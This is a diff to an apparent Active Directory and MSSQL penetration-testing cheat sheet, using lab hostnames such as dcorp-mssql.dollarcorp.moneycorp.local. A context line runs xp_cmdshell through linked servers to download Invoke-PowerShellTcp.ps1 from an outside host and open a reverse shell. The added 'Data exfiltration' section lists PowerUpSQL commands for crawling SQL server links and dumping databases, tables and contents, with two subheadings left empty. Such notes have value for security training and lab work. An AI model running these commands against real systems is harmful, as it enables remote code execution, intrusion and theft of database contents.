@@ -695,6 +695,26 @@ select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''s
 Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000'"
 ```
 
+### Data exfiltration
+```
+#When able to connect directy to the instance
+Get-SQLDatabase
+Get-SQLTable
+Get-SQLColumn
+Get-SQLQuery -Query "use <DATABASE>; SELECT * from <TABLE>"
+
+#Through links
+List databases
+Get-SQLServerLinkCrawl -Instance <INSTANCE> -Query 'SELECT name FROM master..sysdatabases;' | Where-Object customquery | Select-Object instance, customquery -ExpandProperty customquery | Select-Object instance, name
+
+List tables
+Get-SQLServerLinkCrawl -Instance <INSTANCE> -QueryTarget AC-DBBUSINESS -Query "SELECT name FROM <DATABASE>..sysobjects WHERE xtype = 'U'" | Select-Object -ExpandProperty customquery
+
+List columns
+
+List the contents of table
+```
+
 ## Foreign Security Principals
 - A Foreign Security Principal (FSP) represents a Security Principal in a external forest trust or special identities (like Authenticated Users, Enterprise DCs etc.).
 
